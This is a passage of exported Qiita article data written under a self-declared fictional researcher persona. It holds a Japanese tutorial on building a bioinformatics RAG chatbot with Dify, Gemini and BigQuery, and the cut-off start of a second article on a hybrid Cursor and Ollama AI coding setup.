href=\"#-%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE%E3%83%AA%E3%83%B3%E3%82%AF%E9%9B%86\"><i class=\"fa fa-link\"></i></a>🔗 参考文献・リンク集</h2>\n<ul data-sourcepos=\"258:1-265:0\">\n<li data-sourcepos=\"258:1-258:48\"><a href=\"https://www.dify.ai/\" rel=\"nofollow noopener\" target=\"_blank\">Dify 公式サイト</a></li>\n<li data-sourcepos=\"259:1-259:114\"><a href=\"https://cloud.google.com/vertex-ai/docs/generative-ai/learn/gemini-models\" rel=\"nofollow noopener\" target=\"_blank\">Google Cloud Vertex AI Gemini LLM</a></li>\n<li data-sourcepos=\"260:1-260:79\"><a href=\"https://cloud.google.com/bigquery/docs\" rel=\"nofollow noopener\" target=\"_blank\">BigQuery 公式ドキュメント</a></li>\n<li data-sourcepos=\"261:1-261:73\"><a href=\"https://nextjs.org/docs/api-routes/introduction\" rel=\"nofollow noopener\" target=\"_blank\">Next.js API Routes</a></li>\n<li data-sourcepos=\"262:1-265:0\">過去の関連Qiita記事\n<ul data-sourcepos=\"263:3-265:0\">\n<li data-sourcepos=\"263:3-263:139\"><a href=\"https://qiita.com/cocokara_bioinfo/items/4bd415ef2f801497951e\" id=\"reference-63efa376bc2936534d07\">PythonでQiita記事投稿を自動化するパイプライン構築</a></li>\n<li data-sourcepos=\"264:3-265:0\"><a href=\"https://qiita.com/cocokara_bioinfo/items/7440c80d8e6a98177957\" id=\"reference-5883d22086266fd31595\">Python × GitHub Actions でのQiita自動投稿パイプライン</a></li>\n</ul>\n</li>\n</ul>\n<hr data-sourcepos=\"266:1-267:0\">\n<p data-sourcepos=\"268:1-268:265\">GEM Labの調査活動は今後もAIとクラウド技術を駆使した未知生命解析高度化を目指します。次回はGemini LLMのカスタムチューニングや多言語チャットボット展開に迫る予定です。乞うご期待ください。</p>\n",
      "body": "# DifyとGemini LLMを活用したバイオインフォマティクス向けRAGチャットボット構築とBigQuery連携実装ガイド\n\n> **対象読者**  \n> バイオインフォマティクス研究者・エンジニア、AIチャットボット開発者、クラウド技術者、Qiita記事自動投稿に関心のある中級以上のプログラマー\n\n> **動作確認環境 / 前提条件**  \n> - OS: Ubuntu 22.04 LTS / macOS Monterey  \n> - Python 3.9以上  \n> - Google Cloud SDK最新バージョン  \n> - BigQueryアクセス権限  \n> - Difyアカウント（無料プラン可）  \n> - Google Cloud Vertex AI Gemini LLM利用権限  \n> - 前提知識: Pythonプログラミング基礎、REST API利用経験、GCPの基本操作\n\n> **この記事で得られること**  \n> 1. Difyノーコードプラットフォームでバイオ知識ナレッジベースを構築する手順  \n> 2. PythonでのGemini LLM連携による埋め込み検索＋自然言語応答の実装例  \n> 3. BigQueryでのチャットボットログ蓄積と分析基盤設計、Next.jsによるWeb最適化例\n\n---\n\n## 🧭 導入：AIナレッジベースとRAGチャットボットの重要性\n\nGEM Labの若手調査員として新大陸の未知生命の探索調査を進める中、「大量の研究論文や解析報告をどう効率的に活用・共有するか」が課題となりました。バイオインフォマティクス領域ではデータも知識も膨大で散逸しやすく、調査活動の迅速な意思決定に支障をきたします。\n\nこうした課題を解決してくれるのが、最新のAI大規模言語モデル（LLM）を用いた**RAG（Retrieval-Augmented Generation）チャットボット**です。RAGは知識検索機能を組み合わせLLMの生成力で自然言語応答を行います。特にDifyのようなノーコードプラットフォームと、Google CloudのGemini LLMの組み合わせは導入の敷居が低く、かつ高度な対話が可能です。\n\n本記事では、GEM Labの調査員の視点でバイオインフォマティクス特化型チャットボットの構築から、大規模評価ログの管理、WebUI最適化までの技術的ワークフローを具体的に紹介します。これにより、読者の皆さんにも自分の研究や事業に適用可能な汎用技術として習得できる内容としています。\n\n---\n\n## 📘 トピックの概要：DifyとGemini LLMで実現するRAGチャットボット\n\n### Difyプラットフォームとは  \nDifyはノーコードで文章のチャンク分割・埋め込み検索を実現できるクラウドサービスです。大量文書を小さな情報単位に分割（チャンク化）し、意味的に近い情報を高速検索できます。GEM Labの未知生命データ解析報告もこの方式で管理可能です。\n\n### Gemini LLMの特徴  \nGoogle Cloud Vertex AIで提供されるGemini LLMは、膨大な科学論文や技術データを学習した強力な大規模言語モデルです。検索した文書チャンクを入力に文脈を理解し、自然な回答を生成します。\n\n### RAGの技術背景  \nRAGは大まかに2段階に分けられます：\n\n1. **Retrieval（検索）**：ユーザーの質問に関連する文書チャンクを埋め込みベクトル検索で特定  \n2. **Augmented Generation（拡張生成）**：Gemini LLMに検索結果を与え、質問への回答を生成\n\nこうしてLLMの大量知識保持に加え、最新のローカル知見を活用できるハイブリッド設計が成り立ちます。\n\n（文章で図解イメージ案：  \n「質問入力 → ベクトル埋め込み → Dify検索 → 関連文書チャンク抽出 → Gemini LLMへ提供 → 自然言語回答生成」）\n\n---\n\n## 🔧 技術的な仕組み：RAGとBigQuery評価ログ基盤の詳細\n\n### 1. 文章チャンクの再帰分割と重複チャンク戦略  \n長大な論文や報告を単純に分割すると、切れ目で意味があいまいになることがあります。再帰的な分割アルゴリズムで小単位に分割しつつ、前後のチャンクを重複させることで文脈を保持。  \nこの手法はDifyプラットフォーム上でGUI操作もしくはAPI経由で設定可能です。\n\n### 2. 埋め込みベクトル検索  \nチャンク文書はBERT系埋め込みモデルでベクトル化され、検索時はcos類似度等で関連度スコアを算出。高速な類似度検索はANNアルゴリズム（HNSWなど）でスケールします。\n\n### 3. BigQuery上の推論・評価ログ管理  \nGEM Labの膨大な推論データを扱うためBigQueryに下記テーブルを設計しました：\n\n- **InferenceLog**：質問文、検索チャンクID、Gemini応答文、タイムスタンプ\n- **ResponseMetadata**：Geminiの生成パラメータ（温度、最大トークン数等）\n- **UserFeedback**：調査員からの評価スコアやコメント\n\nこれらを結合分析し、対話性能の継続的改善と異常検知、性能モニタリングに活用しています。\n\n---\n\n## 🧪 実践編：Difyでのナレッジベース構築とPythonによる関連検索＋応答生成\n\n### 1. Dify GUIでのテキストアップロード・チャンク識別設定手順\n\n```bash\n# Difyへログイン後の基本操作概要\n# 1. ナレッジベース作成 → [新規作成]クリック\n# 2. バイオ関連文書をPDF・テキストでアップロード\n# 3. チャンクサイズ（例：500トークン）とオーバーラップ率（例：20%）を設定\n# 4. 自動チャンク生成ボタン押下 → 分割処理実行開始\n# 5. 埋め込みベクトル生成&インデックス作成の進捗を待つ\n# 6. 検索設定で類似度閾値や結果取得件数を調整\n```\n\n> GUIのため細部ステップは画面キャプチャ付きの公式ドキュメント参照がおすすめです。\n\n### 2. Python擬似コードでの埋め込み検索とGemini API呼び出し例\n\n```python\nimport requests\nimport json\n\n# DifyのAPIキーとGemini LLMエンドポイント\nDIFY_API_URL = \"https://api.dify.ai/v1/search\"\nDIFY_API_KEY = \"your_dify_api_key\"\n\nGEMINI_API_URL = \"https://vertexai.googleapis.com/v1/projects/{project_id}/locations/{location}/models/{model}:predict\"\nGEMINI_API_KEY = \"your_gemini_api_key\"\n\ndef search_chunks(question: str):\n    headers = {\n        \"Authorization\": f\"Bearer {DIFY_API_KEY}\",\n        \"Content-Type\": \"application/json\",\n    }\n    payload = {\n        \"query\": question,\n        \"top_k\": 5\n    }\n    response = requests.post(DIFY_API_URL, headers=headers, json=payload)\n    response.raise_for_status()\n    return response.json()  # 検索チャンクの詳細リスト\n\ndef generate_answer(context_chunks: list, question: str):\n    prompt = f\"以下の情報を参考に質問に回答してください：\\n{''.join([c['text'] for c in context_chunks])}\\n質問：{question}\\n回答：\"\n    headers = {\n        \"Authorization\": f\"Bearer {GEMINI_API_KEY}\",\n        \"Content-Type\": \"application/json\",\n    }\n    data = {\n        \"instances\": [{\"content\": prompt}],\n        \"parameters\": {\n            \"temperature\": 0.3,\n            \"maxOutputTokens\": 512\n        }\n    }\n    response = requests.post(GEMINI_API_URL, headers=headers, json=data)\n    response.raise_for_status()\n    pred = response.json()\n    return pred['predictions'][0]['content']\n\nif __name__ == \"__main__\":\n    user_question = \"RNA-seqデータの正規化方法は何ですか？\"\n    search_result = search_chunks(user_question)\n    context = search_result.get(\"results\", [])\n    answer = generate_answer(context, user_question)\n    print(\"=== 質問 ===\")\n    print(user_question)\n    print(\"=== 回答 ===\")\n    print(answer)\n```\n\n- **ディレクトリ構成例**  \n```\nproject-root/\n├── main.py             # 上記コード\n├── requirements.txt    # requestsやGCPクライアント記載\n└── README.md\n```\n\n- **依存関係**  \n```\nrequests==2.28.1\n```\n\n---\n\n## 🚀 応用・発展・実用例：バイオデータ解析とNext.jsによるUI最適化\n\n### バイオインフォメティクスへの適用例  \n- ゲノム・RNA-seq解析論文のRAG検索で、解析方法やパラメータの即時回答を実現。調査員は未知生命ゲノムの特徴把握に活用可能。  \n- BigQueryの推論・評価ログから、質問傾向やGemini応答品質を分析し継続的チューニング。  \n\n### BigQueryスキーマ設計例（推論・レスポンス・評価テーブル）\n\n```sql\nCREATE TABLE InferenceLog (\n    id STRING PRIMARY KEY,\n    user_query STRING,\n    retrieved_chunks ARRAY<STRING>,\n    gemini_response STRING,\n    timestamp TIMESTAMP\n);\n\nCREATE TABLE ResponseMetadata (\n    inference_id STRING,\n    temperature FLOAT64,\n    max_tokens INT64,\n    model_version STRING,\n    FOREIGN KEY (inference_id) REFERENCES InferenceLog(id)\n);\n\nCREATE TABLE UserFeedback (\n    inference_id STRING,\n    feedback_score INT64, -- 1-5評価\n    comment STRING,\n    timestamp TIMESTAMP,\n    FOREIGN KEY (inference_id) REFERENCES InferenceLog(id)\n);\n```\n\n### Next.js proxy.tsでのプリフェッチ制御コード抜粋\n\n```typescript\n// proxy.ts: Next.js API routeでGemini API呼び出し簡略化かつプリフェッチ無効化設定\nimport type { NextApiRequest, NextApiResponse } from 'next';\n\nexport const config = {\n  api: {\n    bodyParser: true,\n    externalResolver: true,\n  },\n};\n\nexport default async function handler(req: NextApiRequest, res: NextApiResponse) {\n  // プリフェッチ制御：GETメソッド時の過剰呼出し防止\n  if (req.method === 'GET' && req.headers['x-nextjs-data-prefetch'] === '1') {\n    return res.status(204).end();\n  }\n  \n  // Gemini API呼び出し処理をここに記述\n  // 例: fetchでPOST送信し結果を返す\n  const response = await fetch(process.env.GEMINI_API_ENDPOINT!, {\n    method: 'POST',\n    headers: {\n      'Content-Type': 'application/json',\n      'Authorization': `Bearer ${process.env.GEMINI_API_KEY}`,\n    },\n    body: JSON.stringify(req.body),\n  });\n  const data = await response.json();\n  res.status(response.status).json(data);\n}\n```\n\n---\n\n## 📝 まとめ（Takeaways）\n\n- DifyとGemini LLMの連携で、バイオインフォマティクス領域の専門知識を活用したRAGチャットボットを手軽に構築可能  \n- 文章チャンクの再帰分割・重複戦略と埋め込み検索により高度な文脈理解を実現  \n- BigQueryを用いた推論・評価ログ管理は継続的品質改善の基盤となる  \n- Next.jsのAPIルートを活用したWebUI最適化でユーザー体験向上が可能  \n- GEM Labの調査環境で得られた知見は将来的な未知生命の迅速解析・意思決定を後押しする\n\n---\n\n## ❓ FAQ\n\n**Q1: Gemini LLMを使う際に注意すべき点は？**  \n- セキュリティトークン管理を厳重にし、不正利用を防止してください。  \n- モデルの応答生成パラメータはケースに応じて調整し、無用な長文生成を避けることが重要です。  \n\n**Q2: Difyノーコードプラットフォームの無料プランで制限は？**  \n- 一部機能制限や同時利用リクエスト数制限があります。大規模運用時は有料プラン検討を推奨します。  \n\n**Q3: BigQueryの料金を抑える工夫は？**  \n- ログは必要最小限に絞り、パーティショニングやクラスタリングを活用してクエリコスト低減を図ります。  \n\n**Q4: 他言語やフレームワークでの応用は？**  \n- REST APIベースなので、Python以外にNode.jsやGoなど任意言語からの連携が可能です。\n\n---\n\n## 🔗 参考文献・リンク集\n\n- [Dify 公式サイト](https://www.dify.ai/)  \n- [Google Cloud Vertex AI Gemini LLM](https://cloud.google.com/vertex-ai/docs/generative-ai/learn/gemini-models)  \n- [BigQuery 公式ドキュメント](https://cloud.google.com/bigquery/docs)  \n- [Next.js API Routes](https://nextjs.org/docs/api-routes/introduction)  \n- 過去の関連Qiita記事  \n  - [PythonでQiita記事投稿を自動化するパイプライン構築](https://qiita.com/cocokara_bioinfo/items/4bd415ef2f801497951e)  \n  - [Python × GitHub Actions でのQiita自動投稿パイプライン](https://qiita.com/cocokara_bioinfo/items/7440c80d8e6a98177957)  \n\n---\n\nGEM Labの調査活動は今後もAIとクラウド技術を駆使した未知生命解析高度化を目指します。次回はGemini LLMのカスタムチューニングや多言語チャットボット展開に迫る予定です。乞うご期待ください。\n",
      "coediting": false,
      "comments_count": 0,
      "created_at": "2025-12-07T20:08:00+09:00",
      "group": null,
      "id": "0db33ffad46d14781952",
      "likes_count": 0,
      "private": false,
      "reactions_count": 0,
      "stocks_count": 0,
      "tags": [
        {
          "name": "Python",
          "versions": []
        },
        {
          "name": "自動化",
          "versions": []
        }
      ],
      "title": "DifyとGemini LLMを活用したバイオインフォマティクス向けRAGチャットボット構築とBigQuery連携実装ガイド",
      "updated_at": "2025-12-07T20:08:00+09:00",
      "url": "https://qiita.com/cocokara_bioinfo/items/0db33ffad46d14781952",
      "user": {
        "description": "ポッケ村出身の名もなき若手生物学研究員です。\r\n現代の技術やエンジニア知識を学びながらモンスターハンターの生態・生物学研究に日々励んでおります！\r\nまだまだ勉強不足なところはありますが、皆さんに少しでも学びになるものをお届けできればとの思いで発信させていただきます\r\n\r\n※フィクションとして、時にTips記事として楽しんでいただければ幸いです",
        "facebook_id": "",
        "followees_count": 3,
        "followers_count": 0,
        "github_login_name": null,
        "id": "cocokara_bioinfo",
        "items_count": 4,
        "linkedin_id": "",
        "location": "",
        "name": "シャル・S 調査員",
        "organization": "Genome & Ecology Monster-Lab (架空)",
        "permanent_id": 4288059,
        "profile_image_url": "https://lh3.googleusercontent.com/a/ACg8ocLkgrrRuDzozKQ4XeInetzc0um1rPWRGXY2daT9pLIi1z1JdQ=s96-c",
        "team_only": false,
        "twitter_screen_name": null,
        "website_url": ""
      },
      "page_views_count": 160,
      "team_membership": null,
      "organization_url_name": null,
      "slide": false,
      "_source": "my_popular"
    },
    {
      "rendered_body": "<hr data-sourcepos=\"1:1-2:0\">\n<blockquote data-sourcepos=\"3:1-7:93\">\n<p data-sourcepos=\"3:3-3:20\"><strong>対象読者</strong></p>\n<ul data-sourcepos=\"4:3-7:93\">\n<li data-sourcepos=\"4:3-4:97\">日々のコーディングやデータ解析を効率化したいエンジニア・研究者</li>\n<li data-sourcepos=\"5:3-5:65\">GitHub Copilotの次に試すAIツールを探している方</li>\n<li data-sourcepos=\"6:3-6:105\">バイオインフォマティクスに興味があり、AIをどう活用できるか知りたい方</li>\n<li data-sourcepos=\"7:3-7:93\">機密性の高いデータを扱うため、クラウドAIの利用に懸念がある方</li>\n</ul>\n</blockquote>\n<blockquote data-sourcepos=\"9:1-15:82\">\n<p data-sourcepos=\"9:3-9:41\"><strong>動作確認環境 / 前提条件</strong></p>\n<ul data-sourcepos=\"10:3-15:82\">\n<li data-sourcepos=\"10:3-10:46\">OS: macOS Sonoma (Apple M1) / Ubuntu 22.04</li>\n<li data-sourcepos=\"11:3-11:18\">Cursor: 0.33.1</li>\n<li data-sourcepos=\"12:3-12:18\">Ollama: 0.1.43</li>\n<li data-sourcepos=\"13:3-13:17\">Python: 3.10+</li>\n<li data-sourcepos=\"14:3-14:46\">Dockerが利用可能な環境（推奨）</li>\n<li data-sourcepos=\"15:3-15:82\">기본적인コマンドライン操作、Pythonプログラミングの知識</li>\n</ul>\n</blockquote>\n<blockquote data-sourcepos=\"17:1-20:162\">\n<p data-sourcepos=\"17:3-17:55\"><strong>この記事で得られること（3点程度）</strong></p>\n<ol data-sourcepos=\"18:3-20:162\">\n<li data-sourcepos=\"18:3-18:118\">AIネイティブエディタ「Cursor」の基本的な使い方と、開発効率を上げるための活用法</li>\n<li data-sourcepos=\"19:3-19:128\">ローカル環境で大規模言語モデル（LLM）を動かすツール「Ollama」のセットアップと利用方法</li>\n<li data-sourcepos=\"20:3-20:162\">クラウドAIとローカルLLMを使い分ける、セキュリティと利便性を両立した「ハイブリッドAI解析環境」の構築ノウハウ</li>\n</ol>\n</blockquote>\n<hr data-sourcepos=\"22:1-23:0\">\n<h2 data-sourcepos=\"24:1-24:50\">\n<span id=\"-導入背景課題なぜ重要か\" class=\"fragment\"></span><a href=\"#-%E5%B0%8E%E5%85%A5%E8%83%8C%E6%99%AF%E8%AA%B2%E9%A1%8C%E3%81%AA%E3%81%9C%E9%87%8D%E8%A6%81%E3%81%8B\"><i class=\"fa fa-link\"></i></a>🧭 導入：背景・課題・なぜ重要か</h2>\n<p data-sourcepos=\"26:1-26:628\">GEM Lab（遺伝生態モンスター研究所）の調査員として、我々は日々、未知のモンスター生命体から得られる膨大なゲノムデータと格闘しています。シーケンサーから出力されるテラバイト級のデータを処理し、生命の謎に迫る…聞こえは良いですが、その実態は地道な作業の連続です。解析パイプラインの構築、バグだらけのスクリプトのデバッグ、そして山のような結果の可視化。正直、解析の本質的な部分にたどり着く前に、力尽きてしまうこともしばしばです。</p>\n<p data-sourcepos=\"28:1-28:151\">以前の記事では、GitHub Actionsを使って調査報告（Qiita記事）の投稿を自動化し、「報告」の効率化を図りました。</p>\n<ul data-sourcepos=\"30:1-32:0\">\n<li data-sourcepos=\"30:1-30:183\"><a href=\"https://qiita.com/cocokara_bioinfo/items/4bd415ef2f801497951e\" id=\"reference-a3a720fd02c72cd0d1e0\">【ハマりどころ満載】PythonでQiita記事投稿を自動化するパイプライン構築で爆速改善！</a></li>\n<li data-sourcepos=\"31:1-32:0\"><a href=\"https://qiita.com/cocokara_bioinfo/items/7440c80d8e6a98177957\" id=\"reference-c6a1dcda5efdfdb270e0\">Python × GitHub Actions で始める！Qiita 自動投稿パイプライン構築術</a></li>\n</ul>\n<p data-sourcepos=\"33:1-33:165\">しかし、今回はさらに踏み込み、<strong>「解析」そのものをAIの力で加速させる</strong>ための開発・解析環境についてご紹介します。</p>\n<p data-sourcepos=\"35:1-35:302\">GitHub Copilotは既に多くの開発者にとって手放せないツールとなりましたが、時々「もっと文脈を理解してくれたら…」「このプロジェクト全体のことを分かってくれた上で提案してほしい…」と感じることはないでしょうか？</p>\n<p data-sourcepos=\"37:1-37:549\">この記事では、単なるコード補完ツールを超え、開発者の「思考のパートナー」となるAI駆動の開発環境を構築する方法を解説します。具体的には、AIネイティブエディタ<strong>Cursor</strong>と、ローカル環境でLLMを動かす<strong>Ollama</strong>を組み合わせ、利便性とセキュリティを両立させたハイブリッド環境を目指します。この環境があれば、複雑なモンスターの遺伝子解析も、もっと速く、もっと創造的に進められるはずです。</p>\n<hr data-sourcepos=\"39:1-40:0\">\n<h2 data-sourcepos=\"41:1-41:65\">\n<span id=\"-トピックの概要専門外にも分かる説明\" class=\"fragment\"></span><a href=\"#-%E3%83%88%E3%83%94%E3%83%83%E3%82%AF%E3%81%AE%E6%A6%82%E8%A6%81%E5%B0%82%E9%96%80%E5%A4%96%E3%81%AB%E3%82%82%E5%88%86%E3%81%8B%E3%82%8B%E8%AA%AC%E6%98%8E\"><i class=\"fa fa-link\"></i></a>📘 トピックの概要（専門外にも分かる説明）</h2>\n<h3 data-sourcepos=\"43:1-43:33\">\n<span id=\"ai駆動開発環境とは\" class=\"fragment\"></span><a href=\"#ai%E9%A7%86%E5%8B%95%E9%96%8B%E7%99%BA%E7%92%B0%E5%A2%83%E3%81%A8%E3%81%AF\"><i class=\"fa fa-link\"></i></a>AI駆動開発環境とは？</h3>\n<p data-sourcepos=\"45:1-45:267\">「AI駆動開発環境」とは、AI（特に大規模言語モデル, LLM）が開発ワークフローのあらゆる側面に深く統合された環境のことです。これは、単にコードを補完する（Code Completion）だけではありません。</p>\n<ul data-sourcepos=\"47:1-51:0\">\n<li data-sourcepos=\"47:1-47:136\">\n<strong>対話型コーディング</strong>: チャット形式でAIに指示し、コードを生成・修正・リファクタリングする。</li>\n<li data-sourcepos=\"48:1-48:196\">\n<strong>コンテキスト理解</strong>: 開いているファイルだけでなく、プロジェクト全体のコードベースやドキュメントをAIが理解し、より的確な提案を行う。</li>\n<li data-sourcepos=\"49:1-49:139\">\n<strong>デバッグ支援</strong>: エラーメッセージをAIに貼り付けるだけで、原因の特定や修正案を提示してくれる。</li>\n<li data-sourcepos=\"50:1-51:0\">\n<strong>ドキュメント生成</strong>: 既存のコードから仕様書やコメントを自動で生成する。</li>\n</ul>\n<h3 data-sourcepos=\"52:1-52:67\">\n<span id=\"なぜバイオインフォマティクスで重要なのか\" class=\"fragment\"></span><a href=\"#%E3%81%AA%E3%81%9C%E3%83%90%E3%82%A4%E3%82%AA%E3%82%A4%E3%83%B3%E3%83%95%E3%82%A9%E3%83%9E%E3%83%86%E3%82%A3%E3%82%AF%E3%82%B9%E3%81%A7%E9%87%8D%E8%A6%81%E3%81%AA%E3%81%AE%E3%81%8B\"><i class=\"fa fa-link\"></i></a>なぜバイオインフォマティクスで重要なのか？</h3>\n<p data-sourcepos=\"54:1-54:226\">バイオインフォマティクスの世界は、専門的なツールやライブラリ（例: Biopython, Samtools, GATK）、そして複雑なデータフォーマット（FASTA, FASTQ, BAM, VCF）に溢れています。</p>\n<ul data-sourcepos=\"56:1-59:0\">\n<li data-sourcepos=\"56:1-56:241\">\n<strong>学習コストの削減</strong>: 「このライブラリでVCFファイルをパースするにはどう書けば？」といった初歩的な問いにAIが即座に答えてくれるため、学習コストを大幅に削減できます。</li>\n<li data-sourcepos=\"57:1-57:214\">\n<strong>定型作業の自動化</strong>: 塩基配列のクリーニングやフォーマット変換など、頻繁に発生する定型的な前処理スクリプトをAIに一瞬で生成させることができます。</li>\n<li data-sourcepos=\"58:1-59:0\">\n<strong>解析の再現性向上</strong>: AIに依頼して、解析手順をドキュメント化したり、Jupyter Notebookに適切なマークダウン説明を追加したりすることで、解析の再現性を高められます。</li>\n</ul>\n<h3 data-sourcepos=\"60:1-60:60\">\n<span id=\"今回構築するハイブリッドai解析環境\" class=\"fragment\"></span><a href=\"#%E4%BB%8A%E5%9B%9E%E6%A7%8B%E7%AF%89%E3%81%99%E3%82%8B%E3%83%8F%E3%82%A4%E3%83%96%E3%83%AA%E3%83%83%E3%83%89ai%E8%A7%A3%E6%9E%90%E7%92%B0%E5%A2%83\"><i class=\"fa fa-link\"></i></a>今回構築する「ハイブリッドAI解析環境」</h3>\n<p data-sourcepos=\"62:1-62:181\">この記事で提案するのは、クラウドベースの強力なAIと、手元のマシンで動くセキュアなAIを組み合わせた「ハイブリッド環境」です。</p>\n<p data-sourcepos=\"64:1-64:32\">[文章で図解イメージ案]</p>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"65:1-88:3\"><div class=\"highlight\"><pre><code>+-------------------------------------------------------------+\n|                     開発者 (GEM Lab 調査員)                   |\n+-------------------------------------------------------------+\n      |                                      |\n      | エディタ上で対話・コーディング         |\n      |                                      |\n+-------------------------------------------------------------+\n|                 Cursor (AIネイティブエディタ)                 |\n+-------------------------------------------------------------+\n      |                                      |\n      | (1) 一般的な質問/コード生成          | (2) 機密情報を含むコードの相談\n      | (インターネット経由)                 | (ローカルネットワーク内)\n      |                                      |\n+--------------------------+         +-------------------------+\n|   クラウドAI (GPT-4など)   |         |  ローカルLLM (Ollama)   |\n| (OpenAI API)             |         | (Llama3, CodeLlamaなど) |\n+--------------------------+         +-------------------------+\n                                           ^\n                                           |\n                               +-----------------------------+\n                               | モンスター遺伝子データ (機密) |\n                               +-----------------------------+\n</code></pre></div></div>\n<p data-sourcepos=\"90:1-90:108\">このアーキテクチャのポイントは、<strong>扱う情報に応じてAIを使い分ける</strong>点です。</p>\n<ol data-sourcepos=\"91:1-93:0\">\n<li data-sourcepos=\"91:1-91:302\">\n<strong>クラウドAI (Cursor経由)</strong>: 一般的なアルゴリズムの相談や、公開されているライブラリの使い方など、機密情報を含まないタスクに使用します。最新かつ非常に高性能なモデル（GPT-4など）の能力を最大限に活用できます。</li>\n<li data-sourcepos=\"92:1-93:0\">\n<strong>ローカルLLM (Ollama)</strong>: モンスターの遺伝子配列など、絶対に外部に送信できない機密データを含むコードのデバッグや解析ロジックの相談に使用します。これにより、セキュリティを確保しつつAIの支援を受けられます。</li>\n</ol>\n<hr data-sourcepos=\"94:1-95:0\">\n<h2 data-sourcepos=\"96:1-96:62\">\n<span id=\"-技術的な仕組み実装アーキテクチャ\" class=\"fragment\"></span><a href=\"#-%E6%8A%80%E8%A1%93%E7%9A%84%E3%81%AA%E4%BB%95%E7%B5%84%E3%81%BF%E5%AE%9F%E8%A3%85%E3%82%A2%E3%83%BC%E3%82%AD%E3%83%86%E3%82%AF%E3%83%81%E3%83%A3\"><i class=\"fa fa-link\"></i></a>🔧 技術的な仕組み・実装・アーキテクチャ</h2>\n<h3 data-sourcepos=\"98:1-98:48\">\n<span id=\"1-aiネイティブエディタcursor\" class=\"fragment\"></span><a href=\"#1-ai%E3%83%8D%E3%82%A4%E3%83%86%E3%82%A3%E3%83%96%E3%82%A8%E3%83%87%E3%82%A3%E3%82%BFcursor\"><i class=\"fa fa-link\"></i></a>1. AIネイティブエディタ「Cursor」</h3>\n<p data-sourcepos=\"100:1-101:297\"><strong>Cursorとは？</strong><br>\n<a href=\"https://cursor.sh/\" rel=\"nofollow noopener\" target=\"_blank\">Cursor</a>は、VSCodeをフォークして開発された、AI機能を第一に考えて設計されたコードエディタです。VSCodeの拡張機能エコシステムをそのまま利用できるため、既存のVSCodeユーザーはスムーズに移行できます。</p>\n<p data-sourcepos=\"103:1-103:56\"><strong>なぜVSCode + CopilotではなくCursorなのか？</strong></p>\n<ul data-sourcepos=\"104:1-107:0\">\n<li data-sourcepos=\"104:1-104:369\">\n<strong>深いコンテキスト理解</strong>: <code>@</code>シンボルを使って、特定のファイル（<code>@file.py</code>）やドキュメント（<code>@docs</code>）をAIのコンテキストに含めることができます。これにより、「このファイルの実装を参考にして、新しい関数を作って」といった、より精度の高い指示が可能になります。</li>\n<li data-sourcepos=\"105:1-105:308\">\n<strong>インラインでの編集・チャット</strong>: コードを選択して<code>Cmd+K</code>（Windows/Linuxでは<code>Ctrl+K</code>）を押すだけで、その場でAIと対話し、コードを直接編集させることができます。エディタとチャットウィンドウを行き来する必要がありません。</li>\n<li data-sourcepos=\"106:1-107:0\">\n<strong>AIによるリファクタリング</strong>: 「この関数の変数名を分かりやすくして」「このクラスにテストコードを書いて」といったリファクタリング作業をAIに一任できます。</li>\n</ul>\n<p data-sourcepos=\"108:1-108:34\"><strong>メリット／デメリット</strong></p>\n<ul data-sourcepos=\"109:1-111:0\">\n<li data-sourcepos=\"109:1-109:151\">\n<strong>メリット</strong>: 開発速度が劇的に向上する。複雑なコードベースの理解が容易になる。AIとの対話がシームレス。</li>\n<li data-sourcepos=\"110:1-111:0\">\n<strong>デメリット</strong>: デフォルトではCursorのサーバーを経由してOpenAIのAPIを利用するため、プライバシーポリシーの確認が必要。一部機能は有料。</li>\n</ul>\n<p data-sourcepos=\"112:1-113:506\"><strong>初心者がつまずくポイント</strong><br>\nプロンプトの書き方に少しコツが必要です。ただ「〇〇して」と書くのではなく、「あなたは経験豊富なバイオインフォマティシャンです。Biopythonを使って、FASTAファイルからGC含量を計算する関数を書いてください。エラーハンドリングも考慮してください。」のように、<strong>役割（ペルソナ）、文脈、詳細な要件</strong>を伝えることで、生成されるコードの質が格段に向上します。</p>\n<h3 data-sourcepos=\"115:1-115:46\">\n<span id=\"2-ローカルllm実行環境ollama\" class=\"fragment\"></span><a href=\"#2-%E3%83%AD%E3%83%BC%E3%82%AB%E3%83%ABllm%E5%AE%9F%E8%A1%8C%E7%92%B0%E5%A2%83ollama\"><i class=\"fa fa-link\"></i></a>2. ローカルLLM実行環境「Ollama」</h3>\n<p data-sourcepos=\"117:1-118:296\"><strong>Ollamaとは？</strong><br>\n<a href=\"https://ollama.com/\" rel=\"nofollow noopener\" target=\"_blank\">Ollama</a>は、Llama 3, Code Llama, MistralといったオープンソースのLLMを、自分のPC上で驚くほど簡単に実行できるようにするツールです。複雑な環境構築は不要で、数個のコマンドを打つだけで準備が完了します。</p>\n<p data-sourcepos=\"120:1-121:404\"><strong>なぜローカルLLMが必要なのか？</strong><br>\n最大の理由は<strong>セキュリティ</strong>です。GEM Labが扱うモンスターの遺伝子情報は最高機密事項。これを外部のAPIに送信することは絶対に許されません。Ollamaを使えば、全ての処理がローカルマシン内で完結するため、情報漏洩のリスクをゼロにできます。オフライン環境でも動作するのも大きな利点です。</p>\n<p data-sourcepos=\"123:1-123:34\"><strong>メリット／デメリット</strong></p>\n<ul data-sourcepos=\"124:1-126:0\">\n<li data-sourcepos=\"124:1-124:131\">\n<strong>メリット</strong>: 高いセキュリティとプライバシー。オフライン利用可能。API利用料がかからない。</li>\n<li data-sourcepos=\"125:1-126:0\">\n<strong>デメリット</strong>: 高性能なモデルを動かすには、相応のマシンスペック（特にメモリとGPU）が必要。クラウドの最新モデル（GPT-4oなど）と比較すると性能が劣る場合がある。</li>\n</ul>\n<p data-sourcepos=\"127:1-127:40\"><strong>初心者がつまずくポイント</strong></p>\n<ul data-sourcepos=\"128:1-130:0\">\n<li data-sourcepos=\"128:1-128:288\">\n<strong>メモリ不足</strong>: 大規模なモデルを実行しようとすると、メモリ不足で動作が遅くなったり、エラーが発生したりします。まずは<code>llama3:8b</code>（80億パラメータ）のような比較的小さなモデルから試すのがおすすめです。</li>\n<li data-sourcepos=\"129:1-130:0\">\n<strong>モデルの選択</strong>: 用途に応じてモデルを選ぶ必要があります。コーディング支援なら<code>codellama</code>、汎用的な対話なら<code>llama3</code>、日本語性能を重視するなら<code>gemma:7b</code>など、様々な選択肢があります。Ollamaの<a href=\"https://ollama.com/library\" rel=\"nofollow noopener\" target=\"_blank\">ライブラリページ</a>で探してみましょう。</li>\n</ul>\n<hr data-sourcepos=\"131:1-132:0\">\n<h2 